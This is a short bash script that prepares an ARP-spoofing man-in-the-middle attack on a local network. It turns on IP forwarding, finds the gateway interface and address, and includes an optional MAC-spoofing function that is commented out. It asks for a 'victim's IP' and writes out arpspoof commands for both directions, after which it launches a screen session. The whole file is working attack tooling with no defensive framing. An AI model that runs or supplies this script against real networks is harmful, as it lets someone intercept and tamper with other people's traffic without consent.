#!/bin/bash

function routeme_f() {
    echo 'Configuring machine to allow port forwarding...'
    if [ $(cat /proc/sys/net/ipv4/ip_forward) != 1 ]; then
        echo '1' > /proc/sys/net/ipv4/ip_forward
    fi
}

function gateway_device_f() {
    gateway_r=$(netstat -rn | grep 'UG' | awk '{print $NF}')
    export gateway_r
}

function macspoof_f() {
    echo 'Spoofing mac address'
    ifconfig $gateway_r down
    macchanger -r $gateway_r
    ifconfig $gateway_r up
    echo $(tput setaf 2)Complete!$(tput sgr0)
}

function gateway_f() {
    gateway_r_ip=$(netstat -rn | grep 'UG' | awk '{print $2}')
    export gateway_r_ip
}

function arpspoof_f() {
    echo "I need the victim's IP address:"
    read -r -p '>>> ' victimIP
    export victimIP
    echo ''

    echo Configuring arpspoof between victim and router...
    echo arpspoof -i $gateway_r -t $victimIP $gateway_r_ip
    echo $(tput setaf 2)Complete!$(tput sgr0)
    echo ''

    echo Configuring arpspoof to capture packets from router to victim...
    echo arpspoof -i $gateway_r -t $gateway_r_ip $victimIP
    echo $(tput setaf 2)Complete!$(tput sgr0)
    echo ''
}

routeme_f
gateway_device_f
#macspoof_f
gateway_f
arpspoof_f

sleep 4
screen -c my_screenrc


